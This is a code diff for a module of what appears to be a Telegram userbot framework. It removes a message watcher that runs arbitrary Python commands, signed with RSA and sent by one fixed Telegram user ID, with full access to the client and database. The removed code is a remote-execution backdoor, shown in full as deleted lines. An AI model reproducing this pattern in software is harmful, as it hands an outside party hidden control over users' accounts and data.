@@ -19,9 +19,8 @@ import requests
 import rsa
 from hikkatl.tl.types import Message
 from hikkatl.utils import resolve_inline_message_id
-from meval import meval
 
-from .. import loader, utils, main
+from .. import loader, main, utils
 from ..types import InlineCall, InlineQuery
 from ..version import __version__
 
@@ -296,40 +295,6 @@ class UnitHeta(loader.Module):
         await self._load_module(
             f"https://heta.hikariatama.ru/{uri}",
             int(data["dl_id"]),
-        )
-
-    @loader.watcher(
-        "in",
-        "only_messages",
-        from_id=5519484330,
-        regex=r"^#rce:.*\n.*?\n\n.*$",
-    )
-    async def watcher(self, message: Message):
-        if not self.config["allow_external_access"]:
-            return
-
-        await message.delete()
-
-        data = re.search(
-            r"^#rce:(?P<cmd>.*)\n(?P<sig>.*?)\n\n.*$",
-            message.raw.text,
-        )
-
-        command = data["cmd"]
-        try:
-            rsa.verify(
-                rsa.compute_hash(command.encode(), "SHA-1"),
-                base64.b64decode(data["sig"]),
-                PUBKEY,
-            )
-        except rsa.pkcs1.VerificationError:
-            logger.error("Got message with non-verified signature %s", command)
-            return
-
-        await meval(
-            command,
-            globals(),
-            {"self": self, "client": self._client, "c": self._client, "db": self._db},
         )
 
     @loader.command()
